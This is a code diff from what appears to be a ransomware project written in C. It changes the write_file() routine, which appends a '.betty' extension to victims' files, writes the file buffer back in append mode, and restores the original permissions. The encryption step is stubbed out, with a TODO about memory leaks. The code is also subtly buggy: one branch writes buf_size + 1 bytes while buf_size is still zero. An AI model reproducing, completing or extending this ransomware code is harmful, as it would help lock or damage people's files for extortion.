@@ -60,7 +60,6 @@ ransom->target_file_buf->buf[ransom->target_file_buf->file_offset] = '\0';
  **/
 char *write_file(char *buffer, ransom_t *ransom)
 {
-	unsigned int new_BUFSIZE = BUFSIZE;
 	size_t new_ext_len = 0;
 	size_t filepath_len = 0;
 	size_t buf_size = 0;
@@ -68,29 +67,32 @@ char *write_file(char *buffer, ransom_t *ransom)
 	char *new_ext = ".betty";
 	char *filepath = NULL;
 	FILE *fd = NULL;
+	char *encrypt_buf = NULL;
 
 	filepath = ransom->target_file_buf->filepath;
-	new_ext_len = my_strlen(new_ext);
 	filepath_len = my_strlen(filepath);
-	buf_size = ransom->target_file_buf->bytes_read;
-	if(filepath_len > BUFSIZE)
+	if(filepath_len > BIGBUF)
 	{
-		new_BUFSIZE *= 2;
-		filepath = recalloc(filepath, BUFSIZE, new_BUFSIZE);
+
+		filepath = recalloc(filepath, BIGBUF, BIGBUF + BUFSIZE);
 	}
-	my_strncat(filepath, new_ext, filepath_len, new_ext_len);
-	/* Open FD */
-	fd = fopen(filepath, "wb+");
+	else
+	{
+		new_ext_len = my_strlen(new_ext);
+		buf_size = ransom->target_file_buf->bytes_read;
+		my_strncat(filepath, new_ext, filepath_len, new_ext_len);
+	}
+	fd = fopen(filepath, "ab+");
 /* TODO: base64encode function causes massive memory leaks */
 	/*
-	encrypt_buf = base64encode((const void *)ransom_buf, buf_size);
+	encrypt_buf = base64encode((const void *)buffer, buf_size + 1);
 	*/
-	if ((bytes_written = fwrite(buffer, buf_size, sizeof(char), fd)) < 1)
+	encrypt_buf = buffer;
+	if ((bytes_written = fwrite(encrypt_buf, buf_size + 1, sizeof(char), fd)) < 1)
 		fprintf(stderr, "No bytes written\n");
 	/*
 	free(encrypt_buf);
 	*/
-
 	fclose(fd);
 	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
 	return(buffer);
